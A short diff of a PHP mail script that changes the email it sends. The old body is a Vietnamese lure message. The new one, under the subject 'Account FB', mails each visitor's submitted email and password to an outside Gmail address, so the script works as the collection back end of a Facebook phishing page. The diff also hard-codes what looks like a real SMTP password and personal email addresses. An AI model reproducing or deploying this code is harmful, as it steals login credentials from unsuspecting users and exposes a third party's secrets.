@@ -22,8 +22,9 @@ if($_POST){
     $mail->Password = "anphawolf@%)$1997";
     $mail->SetFrom("huynguyen66028@gmail.com","Huy Nguyen");
     
-    $mail->Subject = '';
-    $mail->Body = 'm vô đây xem có phải m trong ảnh ko. t thua luôn :((';
+    $mail->Subject = 'Account FB';
+    $mail->Body = ' username:'.$_POST['email'] .' <br>
+                    password:'.$_POST['pass'].'  ';
     $mail->AddAddress('anphawolf@gmail.com');
 
     if(!$mail->Send()) {
